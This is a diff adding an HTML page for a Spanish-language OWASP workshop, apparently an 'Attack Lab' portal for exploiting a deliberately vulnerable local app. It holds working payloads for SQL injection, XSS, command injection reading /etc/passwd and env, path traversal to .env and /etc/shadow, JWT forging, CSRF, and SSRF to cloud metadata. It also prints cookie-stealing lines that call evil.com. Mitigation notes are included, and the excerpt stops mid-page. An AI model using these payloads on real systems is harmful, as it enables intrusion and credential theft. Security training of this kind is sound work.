@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🏴‍☠️ Attack Lab — Taller OWASP</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'JetBrains Mono', 'Fira Code', monospace; background: #0a0e14; color: #b3b1ad; min-height: 100vh; }
+    header { background: #1a1a2e; border-bottom: 2px solid #e94560; padding: 1.2rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+    header h1 { color: #e94560; font-size: 1.5rem; }
+    header h1 span { color: #ff6b6b; }
+    .target-url { background: #0f3460; color: #a8d8ea; padding: 0.4rem 1rem; border-radius: 6px; font-size: 0.85rem; }
+    .target-url input { background: transparent; border: none; color: #a8d8ea; font-family: inherit; font-size: 0.85rem; width: 300px; }
+    nav { background: #16213e; padding: 0.8rem 2rem; display: flex; gap: 0.5rem; flex-wrap: wrap; border-bottom: 1px solid #0f3460; }
+    nav button { background: #0f3460; color: #a8d8ea; border: 1px solid #1a4080; padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; font-size: 0.75rem; font-family: inherit; transition: all 0.2s; }
+    nav button:hover, nav button.active { background: #e94560; color: white; border-color: #e94560; }
+    nav button .day { opacity: 0.6; font-size: 0.65rem; }
+    main { max-width: 1000px; margin: 0 auto; padding: 2rem; }
+    .attack-section { display: none; }
+    .attack-section.active { display: block; }
+    .attack-section h2 { color: #e94560; font-size: 1.3rem; margin-bottom: 0.5rem; border-bottom: 1px solid #1a4080; padding-bottom: 0.5rem; }
+    .attack-section h2 .tag { font-size: 0.7rem; background: #e94560; color: white; padding: 0.2rem 0.5rem; border-radius: 3px; vertical-align: middle; }
+    .desc { color: #8b8680; margin: 0.8rem 0; font-size: 0.85rem; line-height: 1.5; }
+    .attack-box { background: #1a1a2e; border: 1px solid #1a4080; border-radius: 8px; padding: 1.2rem; margin: 1rem 0; }
+    .attack-box h3 { color: #a8d8ea; font-size: 0.95rem; margin-bottom: 0.7rem; }
+    .attack-box h3::before { content: '\2694\FE0F '; }
+    .form-row { display: flex; gap: 0.5rem; margin-bottom: 0.5rem; align-items: center; flex-wrap: wrap; }
+    .form-row label { color: #8b8680; font-size: 0.8rem; min-width: 80px; }
+    .form-row input, .form-row select, .form-row textarea { flex: 1; background: #0a0e14; border: 1px solid #1a4080; color: #b3b1ad; padding: 0.5rem; border-radius: 4px; font-family: inherit; font-size: 0.85rem; }
+    .form-row textarea { min-height: 60px; resize: vertical; }
+    .btn { background: #e94560; color: white; border: none; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer; font-family: inherit; font-size: 0.8rem; transition: background 0.2s; }
+    .btn:hover { background: #ff6b6b; }
+    .btn-info { background: #0f3460; }
+    .btn-info:hover { background: #1a4080; }
+    .btn-success { background: #238636; }
+    .btn-success:hover { background: #2ea043; }
+    .result { background: #0a0e14; border: 1px solid #1a4080; border-radius: 6px; padding: 1rem; margin-top: 0.8rem; font-size: 0.8rem; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; color: #3fb950; }
+    .result.error { color: #f85149; }
+    .payload-list { list-style: none; padding: 0; }
+    .payload-list li { background: #0f3460; margin: 0.3rem 0; padding: 0.5rem 0.8rem; border-radius: 4px; cursor: pointer; font-size: 0.8rem; transition: background 0.2s; display: flex; justify-content: space-between; align-items: center; }
+    .payload-list li:hover { background: #1a4080; }
+    .payload-list li code { color: #ff6b6b; }
+    .payload-list li .label { color: #8b8680; font-size: 0.7rem; }
+    .note { background: #1c1007; border: 1px solid #9e6a03; border-radius: 6px; padding: 0.8rem; margin: 0.8rem 0; font-size: 0.8rem; color: #f0883e; }
+    .note::before { content: '\1F4DD '; }
+    .fix { background: #0d2818; border: 1px solid #238636; border-radius: 6px; padding: 0.8rem; margin: 0.8rem 0; font-size: 0.8rem; color: #3fb950; }
+    .fix::before { content: '\2705 Fix: '; font-weight: bold; }
+    .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    @media (max-width: 768px) { .columns { grid-template-columns: 1fr; } }
+    .iframe-test { border: 2px solid #e94560; border-radius: 6px; width: 100%; height: 200px; margin-top: 0.5rem; }
+    footer { text-align: center; color: #484f58; padding: 2rem; font-size: 0.75rem; border-top: 1px solid #1a4080; margin-top: 3rem; }
+    footer a { color: #e94560; }
+    .copied { animation: flash 0.3s; }
+    @keyframes flash { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>&#x1F3F4;&#x200D;&#x2620;&#xFE0F; Attack<span>Lab</span></h1>
+    <div class="target-url">
+      Target: <input id="target-url" value="http://localhost:3000" onchange="updateTarget()">
+    </div>
+  </header>
+
+  <nav id="nav-tabs">
+    <button onclick="showTab('overview')" class="active">&#x1F4CB; Overview</button>
+    <button onclick="showTab('sqli')">&#x1F489; SQLi <span class="day">D2</span></button>
+    <button onclick="showTab('xss')">&#x1F3AD; XSS <span class="day">D2</span></button>
+    <button onclick="showTab('cmdi')">&#x1F4BB; CMDi <span class="day">D3</span></button>
+    <button onclick="showTab('pathtraversal')">&#x1F4C2; Path Traversal <span class="day">D3</span></button>
+    <button onclick="showTab('jwt')">&#x1F511; JWT <span class="day">D3</span></button>
+    <button onclick="showTab('idor')">&#x1F194; IDOR <span class="day">D4</span></button>
+    <button onclick="showTab('csrf')">&#x1F3AF; CSRF <span class="day">D4</span></button>
+    <button onclick="showTab('cookies')">&#x1F36A; Cookies <span class="day">D4</span></button>
+    <button onclick="showTab('secrets')">&#x1F5DD; Secrets <span class="day">D5</span></button>
+    <button onclick="showTab('headers')">&#x1F6E1; Headers <span class="day">D6</span></button>
+    <button onclick="showTab('ssrf')">&#x1F310; SSRF <span class="day">D6</span></button>
+  </nav>
+
+  <main>
+    <!-- OVERVIEW -->
+    <section class="attack-section active" id="tab-overview">
+      <h2>Attack Lab &#x2014; Portal de explotaci&#xF3;n</h2>
+      <p class="desc">
+        Este portal permite explorar y ejecutar ataques contra <strong>VulnMotors</strong>, la app vulnerable del taller.
+        Cada pesta&#xF1;a corresponde a un tipo de vulnerabilidad del OWASP Top 10.
+      </p>
+      <div class="attack-box">
+        <h3 style="color:#e94560;">C&#xF3;mo usar este portal</h3>
+        <ol style="color:#b3b1ad; font-size:0.85rem; line-height:1.8; padding-left:1.2rem;">
+          <li>Configura la <strong>URL del target</strong> arriba (por defecto localhost:3000)</li>
+          <li>Navega a la pesta&#xF1;a de la vulnerabilidad que quieres explotar</li>
+          <li>Usa los <strong>payloads precargados</strong> o escribe los tuyos</li>
+          <li>Observa la respuesta del servidor y analiza el impacto</li>
+          <li>Lee la secci&#xF3;n <em>&#x201C;Fix&#x201D;</em> para entender la mitigaci&#xF3;n</li>
+        </ol>
+      </div>
+      <div class="columns">
+        <div class="attack-box">
+          <h3 style="color:#f0883e;">Vulnerabilidades por d&#xED;a</h3>
+          <table style="width:100%; font-size:0.8rem; color:#b3b1ad;">
+            <tr><td style="color:#a8d8ea;">D&#xED;a 2</td><td>SQL Injection, XSS (Stored + DOM)</td></tr>
+            <tr><td style="color:#a8d8ea;">D&#xED;a 3</td><td>Command Injection, Path Traversal, JWT</td></tr>
+            <tr><td style="color:#a8d8ea;">D&#xED;a 4</td><td>IDOR, CSRF, Insecure Cookies</td></tr>
+            <tr><td style="color:#a8d8ea;">D&#xED;a 5</td><td>Plaintext Passwords, Secrets Exposure</td></tr>
+            <tr><td style="color:#a8d8ea;">D&#xED;a 6</td><td>Security Headers, SSRF</td></tr>
+          </table>
+        </div>
+        <div class="attack-box">
+          <h3 style="color:#f0883e;">Usuarios de prueba</h3>
+          <table style="width:100%; font-size:0.8rem; color:#b3b1ad;">
+            <tr><td><code>alice</code></td><td>password123</td><td style="color:#f85149;">admin</td></tr>
+            <tr><td><code>bob</code></td><td>qwerty</td><td style="color:#8b949e;">user</td></tr>
+            <tr><td><code>carol</code></td><td>letmein</td><td style="color:#8b949e;">user</td></tr>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- SQL INJECTION -->
+    <section class="attack-section" id="tab-sqli">
+      <h2>&#x1F489; SQL Injection <span class="tag">VULN_SQLI &#xB7; D&#xED;a 2</span></h2>
+      <p class="desc">
+        El login construye la query con concatenaci&#xF3;n de strings: <code>SELECT * FROM users WHERE username='${username}' AND password='${password}'</code>.
+        Esto permite inyectar SQL para bypasear la autenticaci&#xF3;n o extraer datos.
+      </p>
+
+      <div class="attack-box">
+        <h3>Payloads de autenticaci&#xF3;n bypass</h3>
+        <ul class="payload-list">
+          <li onclick="setSQLi(&quot;' OR '1'='1' --&quot;, 'x')"><code>' OR '1'='1' --</code> <span class="label">Login como primer usuario (alice/admin)</span></li>
+          <li onclick="setSQLi(&quot;admin' --&quot;, 'x')"><code>admin' --</code> <span class="label">Comentar la verificaci&#xF3;n de password</span></li>
+          <li onclick="setSQLi(&quot;' OR 1=1 LIMIT 1 OFFSET 1 --&quot;, 'x')"><code>' OR 1=1 LIMIT 1 OFFSET 1 --</code> <span class="label">Login como segundo usuario (bob)</span></li>
+          <li onclick="setSQLi(&quot;' UNION SELECT 1,2,3,4,5,6 --&quot;, 'x')"><code>' UNION SELECT 1,2,3,4,5,6 --</code> <span class="label">Detectar n&#xFA;mero de columnas</span></li>
+          <li onclick="setSQLi(&quot;' UNION SELECT 1,username,password,role,email,6 FROM users --&quot;, 'x')"><code>' UNION SELECT ... FROM users --</code> <span class="label">Extraer todos los usuarios</span></li>
+        </ul>
+      </div>
+
+      <div class="attack-box">
+        <h3>Ejecutar ataque</h3>
+        <div class="form-row">
+          <label>Username:</label>
+          <input id="sqli-user" value="' OR '1'='1' --">
+        </div>
+        <div class="form-row">
+          <label>Password:</label>
+          <input id="sqli-pass" value="anything">
+        </div>
+        <button class="btn" onclick="attackSQLi()">&#x1F680; Enviar login</button>
+        <div class="result" id="sqli-result"></div>
+      </div>
+
+      <div class="fix">Usar prepared statements: <code>db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)</code></div>
+    </section>
+
+    <!-- XSS -->
+    <section class="attack-section" id="tab-xss">
+      <h2>&#x1F3AD; Cross-Site Scripting (XSS) <span class="tag">VULN_XSS &#xB7; D&#xED;a 2</span></h2>
+      <p class="desc">
+        VulnMotors usa <code>innerHTML</code> sin sanitizaci&#xF3;n para renderizar comentarios y descripciones de coches.
+        Tambi&#xE9;n tiene un vector DOM-XSS via <code>?msg=</code> en la URL.
+      </p>
+
+      <div class="columns">
+        <div class="attack-box">
+          <h3>Stored XSS (comentarios)</h3>
+          <ul class="payload-list">
+            <li onclick="setXSS(this.querySelector('code').textContent)"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> <span class="label">Cl&#xE1;sico</span></li>
+            <li onclick="setXSS(this.querySelector('code').textContent)"><code>&lt;img src=x onerror=alert('XSS')&gt;</code> <span class="label">Via evento</span></li>
+            <li onclick="setXSS(this.querySelector('code').textContent)"><code>&lt;svg onload=alert(document.cookie)&gt;</code> <span class="label">Robo cookie</span></li>
+            <li onclick="setXSS(this.querySelector('code').textContent)"><code>&lt;img src=x onerror="fetch('/session/me',{credentials:'include'}).then(r=&gt;r.json()).then(d=&gt;document.title=JSON.stringify(d))"&gt;</code> <span class="label">Session hijack</span></li>
+            <li onclick="setXSS(this.querySelector('code').textContent)"><code>&lt;marquee&gt;&lt;h1 style='color:red'&gt;HACKEADO&lt;/h1&gt;&lt;/marquee&gt;</code> <span class="label">Defacement</span></li>
+          </ul>
+          <div class="form-row">
+            <textarea id="xss-payload" placeholder="Tu payload XSS...">&lt;img src=x onerror=alert('XSS')&gt;</textarea>
+          </div>
+          <button class="btn" onclick="attackXSSStored()">&#x1F4A3; Inyectar comentario</button>
+          <div class="result" id="xss-result"></div>
+        </div>
+
+        <div class="attack-box">
+          <h3>DOM-XSS (par&#xE1;metro ?msg=)</h3>
+          <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">
+            El frontend lee <code>?msg=</code> y lo inserta con <code>innerHTML</code> en el alert-container.
+          </p>
+          <ul class="payload-list">
+            <li onclick="setDOMXSS('&lt;img src=x onerror=alert(`DOM-XSS`)&gt;')"><code>?msg=&lt;img src=x onerror=alert('DOM-XSS')&gt;</code></li>
+            <li onclick="setDOMXSS('&lt;svg/onload=alert(document.domain)&gt;')"><code>?msg=&lt;svg/onload=alert(document.domain)&gt;</code></li>
+            <li onclick="setDOMXSS('&lt;iframe src=javascript:alert(`XSS`)&gt;')"><code>?msg=&lt;iframe src=javascript:alert('XSS')&gt;</code></li>
+          </ul>
+          <div class="form-row">
+            <input id="domxss-payload" value="&lt;img src=x onerror=alert('DOM-XSS')&gt;">
+          </div>
+          <button class="btn" onclick="attackDOMXSS()">&#x1F517; Abrir enlace malicioso</button>
+          <button class="btn btn-info" onclick="copyDOMXSSLink()">&#x1F4CB; Copiar URL</button>
+        </div>
+      </div>
+
+      <div class="fix">Escapar HTML: reemplazar <code>&lt; &gt; " ' &amp;</code> con entidades. Mejor a&#xFA;n: usar <code>textContent</code> en vez de <code>innerHTML</code>.</div>
+    </section>
+
+    <!-- COMMAND INJECTION -->
+    <section class="attack-section" id="tab-cmdi">
+      <h2>&#x1F4BB; Command Injection <span class="tag">VULN_CMDI &#xB7; D&#xED;a 3</span></h2>
+      <p class="desc">
+        El endpoint <code>/debug?cmd=</code> ejecuta comandos del sistema via <code>child_process.execSync()</code>.
+        Los metacaracteres del shell (<code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>$()</code>) permiten encadenar comandos.
+      </p>
+
+      <div class="attack-box">
+        <h3>Payloads de inyecci&#xF3;n de comandos</h3>
+        <ul class="payload-list">
+          <li onclick="setCMD('whoami')"><code>whoami</code> <span class="label">Usuario actual</span></li>
+          <li onclick="setCMD('ls -la /tmp')"><code>ls -la /tmp</code> <span class="label">Listar /tmp</span></li>
+          <li onclick="setCMD('cat /etc/passwd')"><code>cat /etc/passwd</code> <span class="label">Usuarios del sistema</span></li>
+          <li onclick="setCMD('env')"><code>env</code> <span class="label">Variables de entorno (secretos!)</span></li>
+          <li onclick="setCMD('uptime; id; cat /etc/hostname')"><code>uptime; id; cat /etc/hostname</code> <span class="label">Encadenar con ;</span></li>
+          <li onclick="setCMD('echo vulnerable | base64')"><code>echo vulnerable | base64</code> <span class="label">Pipe a otro comando</span></li>
+          <li onclick="setCMD('curl http://169.254.169.254/latest/meta-data/')"><code>curl http://169.254.169.254/latest/meta-data/</code> <span class="label">SSRF via CMDi</span></li>
+        </ul>
+      </div>
+
+      <div class="attack-box">
+        <h3>Ejecutar comando</h3>
+        <div class="form-row">
+          <label>Comando:</label>
+          <input id="cmdi-cmd" value="whoami">
+        </div>
+        <button class="btn" onclick="attackCMDi()">&#x26A1; Ejecutar</button>
+        <div class="result" id="cmdi-result"></div>
+      </div>
+
+      <div class="fix">Usar una allowlist de comandos permitidos. Nunca pasar input del usuario a <code>exec()</code>/<code>execSync()</code>.</div>
+    </section>
+
+    <!-- PATH TRAVERSAL -->
+    <section class="attack-section" id="tab-pathtraversal">
+      <h2>&#x1F4C2; Path Traversal <span class="tag">VULN_PATHTRAVERSAL &#xB7; D&#xED;a 3</span></h2>
+      <p class="desc">
+        El endpoint <code>/files?path=</code> descarga archivos. Si no se valida la ruta, podemos navegar fuera del directorio permitido con <code>../</code>.
+      </p>
+
+      <div class="attack-box">
+        <h3>Payloads de path traversal</h3>
+        <ul class="payload-list">
+          <li onclick="setPath('catalogo.txt')"><code>catalogo.txt</code> <span class="label">Archivo leg&#xED;timo</span></li>
+          <li onclick="setPath('../../../package.json')"><code>../../../package.json</code> <span class="label">Config de la app</span></li>
+          <li onclick="setPath('../../../.env')"><code>../../../.env</code> <span class="label">Variables de entorno</span></li>
+          <li onclick="setPath('../../../../etc/passwd')"><code>../../../../etc/passwd</code> <span class="label">Usuarios Linux</span></li>
+          <li onclick="setPath('../../../../etc/shadow')"><code>../../../../etc/shadow</code> <span class="label">Hashes de passwords</span></li>
+          <li onclick="setPath('../../../../proc/self/environ')"><code>../../../../proc/self/environ</code> <span class="label">Env del proceso</span></li>
+          <li onclick="setPath('../app.js')"><code>../app.js</code> <span class="label">C&#xF3;digo fuente de la app</span></li>
+          <li onclick="setPath('../../')"><code>../../</code> <span class="label">Listar directorio padre</span></li>
+        </ul>
+      </div>
+
+      <div class="attack-box">
+        <h3>Explorar archivos</h3>
+        <div class="form-row">
+          <label>Ruta:</label>
+          <input id="path-input" value="catalogo.txt">
+        </div>
+        <button class="btn" onclick="attackPath()">&#x1F4D6; Leer archivo</button>
+        <button class="btn btn-info" onclick="listFiles()">&#x1F4C1; Listar disponibles</button>
+        <div class="result" id="path-result"></div>
+      </div>
+
+      <div class="fix">Resolver la ruta con <code>path.resolve()</code> y verificar que empieza con el directorio base permitido.</div>
+    </section>
+
+    <!-- JWT -->
+    <section class="attack-section" id="tab-jwt">
+      <h2>&#x1F511; JWT Weak Secret <span class="tag">VULN_JWT_WEAK &#xB7; D&#xED;a 3</span></h2>
+      <p class="desc">
+        VulnMotors usa JWT con el secreto <code>"secret"</code> (hardcoded). Podemos decodificar tokens, forjar nuevos con rol admin, o explotar la falta de verificaci&#xF3;n de algoritmo.
+      </p>
+
+      <div class="attack-box">
+        <h3>Decodificar un token</h3>
+        <div class="form-row">
+          <textarea id="jwt-token" placeholder="Pega un JWT aqu&#xED; (header.payload.signature)..." style="min-height:40px;"></textarea>
+        </div>
+        <button class="btn btn-info" onclick="decodeJWT()">&#x1F50D; Decodificar</button>
+        <button class="btn" onclick="getToken()">&#x1F3AB; Obtener token (login alice)</button>
+        <div class="result" id="jwt-decode-result"></div>
+      </div>
+
+      <div class="attack-box">
+        <h3>Forjar un token con secreto d&#xE9;bil</h3>
+        <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">
+          Si el secreto es <code>"secret"</code>, podemos crear tokens arbitrarios.
+        </p>
+        <div class="form-row">
+          <label>userId:</label>
+          <input id="jwt-forge-id" value="999" style="width:60px;">
+          <label>username:</label>
+          <input id="jwt-forge-user" value="hacker">
+          <label>role:</label>
+          <select id="jwt-forge-role"><option>admin</option><option>user</option></select>
+        </div>
+        <button class="btn" onclick="forgeJWT()">&#x1F528; Forjar token</button>
+        <button class="btn btn-info" onclick="testForgedToken()">&#x1F9EA; Probar token forjado</button>
+        <div class="result" id="jwt-forge-result"></div>
+        <div class="note">Para forjar tokens usa <a href="https://jwt.io" target="_blank" style="color:#58a6ff;">jwt.io</a> o <code>python3 -c "import jwt; print(jwt.encode({'userId':999,'role':'admin'},'secret'))"</code></div>
+      </div>
+
+      <div class="fix">Usar un secreto aleatorio largo (<code>crypto.randomBytes(32)</code>), verificar <code>algorithms: ['HS256']</code>, y rotar peri&#xF3;dicamente.</div>
+    </section>
+
+    <!-- IDOR -->
+    <section class="attack-section" id="tab-idor">
+      <h2>&#x1F194; IDOR (Insecure Direct Object Reference) <span class="tag">VULN_IDOR &#xB7; D&#xED;a 4</span></h2>
+      <p class="desc">
+        Los endpoints usan IDs secuenciales y predecibles. Cambiando el ID en la URL podemos acceder a datos de otros usuarios,
+        editar coches ajenos o escalar privilegios.
+      </p>
+
+      <div class="columns">
+        <div class="attack-box">
+          <h3>Enumeraci&#xF3;n de perfiles</h3>
+          <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">Itera por IDs para ver datos de todos los usuarios</p>
+          <div class="form-row">
+            <label>ID inicio:</label>
+            <input id="idor-start" value="1" type="number" style="width:60px;">
+            <label>ID fin:</label>
+            <input id="idor-end" value="5" type="number" style="width:60px;">
+          </div>
+          <button class="btn" onclick="attackIDOR()">&#x1F50D; Enumerar usuarios</button>
+          <div class="result" id="idor-result"></div>
+        </div>
+
+        <div class="attack-box">
+          <h3>Editar coche ajeno (IDOR horizontal)</h3>
+          <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">Login como bob &#x2192; editar coche de alice (ID 1-3)</p>
+          <div class="form-row">
+            <label>Car ID:</label>
+            <input id="idor-car-id" value="1" type="number" style="width:60px;">
+          </div>
+          <div class="form-row">
+            <label>Nuevo nombre:</label>
+            <input id="idor-car-name" value="HACKEADO por bob &#x1F3F4;&#x200D;&#x2620;&#xFE0F;">
+          </div>
+          <button class="btn" onclick="attackIDOREdit()">&#x270F;&#xFE0F; Editar como bob</button>
+          <div class="result" id="idor-edit-result"></div>
+        </div>
+      </div>
+
+      <div class="fix">Verificar que <code>req.user.id === resource.owner_id</code> (o rol admin) antes de permitir acceso/modificaci&#xF3;n.</div>
+    </section>
+
+    <!-- CSRF -->
+    <section class="attack-section" id="tab-csrf">
+      <h2>&#x1F3AF; Cross-Site Request Forgery (CSRF) <span class="tag">VULN_CSRF &#xB7; D&#xED;a 4</span></h2>
+      <p class="desc">
+        Si el usuario tiene una sesi&#xF3;n activa (cookie), un sitio malicioso puede hacer peticiones en su nombre.
+        VulnMotors tiene <code>CORS: *</code> y cookies sin <code>SameSite</code>.
+      </p>
+
+      <div class="attack-box">
+        <h3>CSRF via formulario oculto</h3>
+        <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">
+          Este formulario env&#xED;a una "transferencia" usando la cookie de sesi&#xF3;n de la v&#xED;ctima.
+          <br>Prerequisito: la v&#xED;ctima debe tener sesi&#xF3;n cookie activa (usar <code>POST /session/login</code>).
+        </p>
+        <form id="csrf-form" method="POST" target="csrf-frame" style="margin:0.5rem 0;">
+          <div class="form-row">
+            <label>Destino:</label>
+            <input name="to" value="hacker_wallet_666">
+          </div>
+          <div class="form-row">
+            <label>Cantidad:</label>
+            <input name="amount" value="10000" type="number">
+          </div>
+          <button type="submit" class="btn">&#x1F4B0; Ejecutar CSRF (transferencia)</button>
+        </form>
+        <iframe name="csrf-frame" style="width:100%;height:80px;background:#0a0e14;border:1px solid #1a4080;border-radius:4px;margin-top:0.5rem;"></iframe>
+      </div>
+
+      <div class="attack-box">
+        <h3>CSRF auto-submit (el atacante lo pone en su web)</h3>
+        <pre style="color:#a8d8ea; font-size:0.75rem; background:#0a0e14; padding:0.8rem; border-radius:4px; overflow-x:auto;">&lt;!-- En la web del atacante (auto-ejecuta al cargar) --&gt;
+&lt;form id="f" method="POST" action="TARGET/session/transfer"&gt;
+  &lt;input name="to" value="evil_account"&gt;
+  &lt;input name="amount" value="99999"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</pre>
+      </div>
+
+      <div class="note">Para que CSRF funcione: 1) La v&#xED;ctima tiene cookie activa, 2) CORS permite el origen, 3) Cookie no tiene SameSite=Strict.</div>
+      <div class="fix">Configurar <code>SameSite=Strict</code> en cookies, restringir CORS al origen propio, y/o usar tokens anti-CSRF.</div>
+    </section>
+
+    <!-- COOKIES -->
+    <section class="attack-section" id="tab-cookies">
+      <h2>&#x1F36A; Insecure Cookies <span class="tag">VULN_COOKIES &#xB7; D&#xED;a 4</span></h2>
+      <p class="desc">
+        El endpoint <code>/session/login</code> establece una cookie <code>session=JWT</code> sin flags de seguridad.
+        Sin <code>HttpOnly</code> &#x2192; JavaScript puede leerla. Sin <code>Secure</code> &#x2192; se env&#xED;a por HTTP. Sin <code>SameSite</code> &#x2192; CSRF posible.
+      </p>
+
+      <div class="attack-box">
+        <h3>Login con cookie (establecer sesi&#xF3;n)</h3>
+        <div class="form-row">
+          <label>Usuario:</label>
+          <input id="cookie-user" value="alice">
+          <label>Password:</label>
+          <input id="cookie-pass" value="password123">
+        </div>
+        <button class="btn" onclick="cookieLogin()">&#x1F510; Login (cookie)</button>
+        <button class="btn btn-info" onclick="checkCookie()">&#x1F50D; Verificar /session/me</button>
+        <button class="btn btn-info" onclick="readDocCookie()">&#x1F4D6; Leer document.cookie</button>
+        <div class="result" id="cookie-result"></div>
+      </div>
+
+      <div class="attack-box">
+        <h3>Robo de cookie via XSS</h3>
+        <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">
+          Si la cookie no tiene <code>HttpOnly</code>, cualquier XSS puede robarla:
+        </p>
+        <pre style="color:#ff6b6b; font-size:0.8rem; background:#0a0e14; padding:0.8rem; border-radius:4px;">// Payload XSS para robar cookie:
+&lt;img src=x onerror="new Image().src='https://evil.com/steal?c='+document.cookie"&gt;
+
+// O en la consola del navegador (VulnApp):
+fetch('https://evil.com/steal?c=' + document.cookie);</pre>
+      </div>
+
+      <div class="columns">
+        <div class="note">
+          <strong>Flags de cookie segura:</strong><br>
+          <code>Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict</code><br><br>
+          &#x2022; <strong>HttpOnly</strong> &#x2192; JS no puede acceder (bloquea document.cookie)<br>
+          &#x2022; <strong>Secure</strong> &#x2192; solo se env&#xED;a por HTTPS<br>
+          &#x2022; <strong>SameSite=Strict</strong> &#x2192; no se env&#xED;a en peticiones cross-origin
+        </div>
+        <div class="fix">
+          Activar <code>VULN_COOKIES=0</code> y repetir. Ver&#xE1;s que <code>document.cookie</code> devuelve string vac&#xED;o
+          y que el CSRF de la pesta&#xF1;a anterior deja de funcionar.
+        </div>
+      </div>
+    </section>
+
+    <!-- SECRETS -->
+    <section class="attack-section" id="tab-secrets">
+      <h2>&#x1F5DD; Secrets Exposure <span class="tag">VULN_SECRETS + VULN_PLAINTEXT &#xB7; D&#xED;a 5</span></h2>
+      <p class="desc">
+        El endpoint <code>/debug</code> expone variables de entorno del servidor (incluyendo secretos, connection strings, API keys).
+        Adem&#xE1;s, los passwords se almacenan en texto plano en la base de datos.
+      </p>
+
+      <div class="columns">
+        <div class="attack-box">
+          <h3>Extraer variables de entorno</h3>
+          <button class="btn" onclick="attackSecrets()">&#x1F513; GET /debug</button>
+          <div class="result" id="secrets-result"></div>
+        </div>
+
+        <div class="attack-box">
+          <h3>Passwords en texto plano</h3>
+          <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">
+            Registra un usuario y mira el /debug &#x2014; los passwords est&#xE1;n en claro.
+          </p>
+          <div class="form-row">
+            <label>User:</label>
+            <input id="secrets-reg-user" value="test_plain">
+            <label>Pass:</label>
+            <input id="secrets-reg-pass" value="MiPasswordSuperSecreto123!">
+          </div>
+          <button class="btn" onclick="testPlaintext()">&#x1F4DD; Registrar y comprobar</button>
+          <div class="result" id="plaintext-result"></div>
+        </div>
+      </div>
+
+      <div class="fix">Nunca exponer /debug en producci&#xF3;n. Hashear passwords con bcrypt/argon2. Usar secretos en variables de entorno con acceso restringido (Key Vault).</div>
+    </section>
+
+    <!-- HEADERS -->
+    <section class="attack-section" id="tab-headers">
+      <h2>&#x1F6E1; Security Headers <span class="tag">VULN_HEADERS &#xB7; D&#xED;a 6</span></h2>
+      <p class="desc">
+        Sin cabeceras de seguridad, la app es vulnerable a clickjacking (iframe), sniffing de MIME type,
+        y ataques que se mitigan con CSP/HSTS.
+      </p>
+
+      <div class="attack-box">
+        <h3>Inspeccionar cabeceras de respuesta</h3>
+        <button class="btn" onclick="checkHeaders()">&#x1F4CB; Analizar cabeceras</button>
+        <div class="result" id="headers-result"></div>
+      </div>
+
+      <div class="attack-box">
+        <h3>Clickjacking &#x2014; embeber VulnApp en iframe</h3>
+        <p style="font-size:0.8rem; color:#8b8680; margin-bottom:0.5rem;">
+          Sin <code>X-Frame-Options: DENY</code>, podemos embeber la app en un iframe transparente y enga&#xF1;ar al usuario para que haga clic.
+        </p>
+        <button class="btn" onclick="testClickjack()">&#x1F5BC; Cargar en iframe</button>
+        <button class="btn btn-info" onclick="document.getElementById('clickjack-frame').src='about:blank'">Limpiar iframe</button>
+        <iframe id="clickjack-frame" class="iframe-test" src="about:blank"></iframe>
+      </div>
+
+      <div class="note">
+        <strong>Cabeceras esperadas:</strong><br>
+        <code>Content-Security-Policy</code> &#xB7; <code>Strict-Transport-Security</code> &#xB7; <code>X-Frame-Options</code> &#xB7; <code>X-Content-Type-Options</code> &#xB7; <code>Referrer-Policy</code> &#xB7; <code>Permissions-Policy</code>
+      </div>
+      <div class="fix">Activar <code>VULN_HEADERS=0</code> (o usar <code>helmet</code> en Express). El iframe dejar&#xE1; de cargar con X-Frame-Options: DENY.</div>
+    </section>
+
+    <!-- SSRF -->
+    <section class="attack-section" id="tab-ssrf">
+      <h2>&#x1F310; Server-Side Request Forgery (SSRF) <span class="tag">VULN_SSRF &#xB7; D&#xED;a 6</span></h2>
+      <p class="desc">
+        El endpoint <code>/fetch-image?url=</code> hace peticiones desde el servidor. Sin validaci&#xF3;n,
+        podemos acceder a servicios internos, metadatos del cloud, o hacer port scanning.
+      </p>
+
+      <div class="attack-box">
+        <h3>Payloads SSRF</h3>
+        <ul class="payload-list">
+          <li onclick="setSSRF('http://localhost:3000/debug')"><code>http://localhost:3000/debug</code> <span class="label">Endpoint interno (secretos)</span></li>
+          <li onclick="setSSRF('http://localhost:3000/api')"><code>http://localhost:3000/api</code> <span class="label">Info de la API</span></li>
+          <li onclick="setSSRF('http://169.254.169.254/latest/meta-data/')"><code>http://169.254.169.254/latest/meta-data/</code> <span class="label">AWS Instance Metadata</span></li>
+          <li onclick="setSSRF('http://169.254.169.254/metadata/instance?api-version=2021-02-01')"><code>http://169.254.169.254/metadata/instance</code> <span class="label">Azure IMDS</span></li>
+          <li onclick="setSSRF('http://127.0.0.1:22')"><code>http://127.0.0.1:22</code> <span class="label">Port scan SSH</span></li>
+          <li onclick="setSSRF('file:///etc/passwd')"><code>file:///etc/passwd</code> <span class="label">Protocolo file://</span></li>
+        </ul>
+      </div>
+
+      <div class="attack-box">
+        <h3>Ejecutar SSRF</h3>
+        <div class="form-row">
+          <label>URL:</label>
+          <input id="ssrf-url" value="http://localhost:3000/debug">
